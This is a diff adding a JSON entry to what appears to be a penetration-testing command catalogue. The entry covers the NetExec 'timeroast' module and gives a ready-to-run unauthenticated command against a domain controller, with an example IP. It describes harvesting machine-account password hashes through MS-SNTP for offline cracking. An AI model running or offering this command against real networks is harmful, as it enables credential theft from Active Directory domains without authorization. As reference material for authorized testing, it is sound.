@@ -1,0 +1,16 @@
+{
+  "id": "nxc-timeroast",
+  "name": "NetExec timeroast Module",
+  "command": "nxc smb <dc-ip> -u '' -p '' -M timeroast",
+  "description": "Timeroast: brute computer-account passwords via the MS-SNTP authenticated NTP exchange. The DC signs replies with the machine-account RC4 key derived from its password, which can be cracked offline. No prior credentials required — the DC will sign for any computer RID you specify.",
+  "platform": "linux",
+  "requires": ["no-creds"],
+  "protocols": ["smb"],
+  "tags": ["netexec", "nxc", "timeroast", "ms-sntp", "machine-account", "offline-cracking"],
+  "references": [
+    { "title": "Timeroast research", "url": "https://github.com/SecuraBV/Timeroast" }
+  ],
+  "examples": [
+    "nxc smb 10.10.10.10 -u '' -p '' -M timeroast"
+  ]
+}
